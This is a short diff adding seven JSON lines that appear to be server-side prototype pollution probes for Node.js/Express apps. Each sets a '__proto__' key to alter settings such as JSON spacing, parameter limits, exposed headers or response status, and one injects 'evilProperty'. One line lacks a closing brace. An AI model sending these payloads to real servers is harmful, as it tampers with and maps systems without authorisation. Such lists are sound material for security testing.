@@ -1,0 +1,7 @@
+{"__proto__":{"json spaces":10}}
+{"__proto__":{"parameterLimit":1}}
+{"__proto__":{"ignoreQueryPrefix":true}}
+{ "__proto__":{"allowDots":true}}
+{ "__proto__":{"exposedHeaders":["foo"]}}
+{ "__proto__":{"status":510}
+{"__proto__": {"evilProperty": "evilPayload"}}
